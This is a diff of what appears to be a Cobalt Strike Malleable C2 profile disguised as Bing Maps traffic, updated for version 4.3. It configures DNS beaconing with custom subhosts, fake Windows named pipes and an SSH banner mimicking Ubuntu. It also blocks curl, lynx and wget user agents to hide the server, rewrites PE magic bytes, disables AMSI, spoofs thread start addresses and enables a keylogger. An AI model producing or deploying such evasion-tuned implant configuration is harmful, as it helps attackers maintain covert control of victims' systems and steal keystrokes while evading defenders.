@@ -7,21 +7,34 @@ set sample_name "bing_maps.profile";
 set sleeptime "38500";
 set jitter    "27";
 set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
+set data_jitter "50";
 
 set host_stage "false";
 
 ###DNS options###
-set dns_idle "8.8.8.8";
-set maxdns    "245";
-set dns_sleep "0";
-set dns_stager_prepend "";
-set dns_stager_subhost "";
-set dns_max_txt "252";
-set dns_ttl "1";
+dns-beacon {
+    # Options moved into 'dns-beacon' group in 4.3:
+    set dns_idle             "8.8.8.8";
+    set dns_max_txt          "220";
+    set dns_sleep            "0";
+    set dns_ttl              "1";
+    set maxdns               "255";
+    set dns_stager_prepend   ".wwwds.";
+    set dns_stager_subhost   ".e2867.dsca.";
+     
+    # DNS subhost override options added in 4.3:
+    set beacon               "d-bx.";
+    set get_A                "d-1ax.";
+    set get_AAAA             "d-4ax.";
+    set get_TXT              "d-1tx.";
+    set put_metadata         "d-1mx";
+    set put_output           "d-1ox.";
+    set ns_response          "zero";
+}
 
 ###SMB options###
-set pipename "ntsvcs";
-set pipename_stager "scerpc";
+set pipename "ntsvcs##";
+set pipename_stager "scerpc##";
 set smb_frame_header "";
 
 ###TCP options###
@@ -30,6 +43,7 @@ set tcp_frame_header "";
 
 ###SSH BANNER###
 set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
+set ssh_pipename "SearchTextHarvester##";
 
 ###SSL Options###
 #https-certificate {
@@ -44,13 +58,17 @@ set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)
 #}
 
 ###HTTP-Config Block###
-#http-config {
+http-config {
 #    set headers "Server, Content-Type";
 #    header "Content-Type" "text/html;charset=UTF-8";
 #    header "Server" "nginx";
 #
-#    set trust_x_forwarded_for "false";
-#}
+    set trust_x_forwarded_for "false";
+    
+    set block_useragents "curl*,lynx*,wget*";
+}
+
+#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";
 
 ###HTTP-GET Block###
 http-get {
@@ -519,6 +537,11 @@ stage {
     set sleep_mask "true";
     
     set smartinject "true";
+    
+    #set allocator "HeapAlloc";
+    set magic_mz_x86 "MZRE";
+    set magic_mz_x64 "MZAR";
+    set magic_pe "EA";
 
     set module_x86 "wwanmm.dll";
     set module_x64 "wwanmm.dll";
@@ -587,5 +610,9 @@ post-ex {
     set smartinject "true";
 
     set amsi_disable "true";
+    
+    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
+    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
+    set keylogger "SetWindowsHookEx";
 
 }
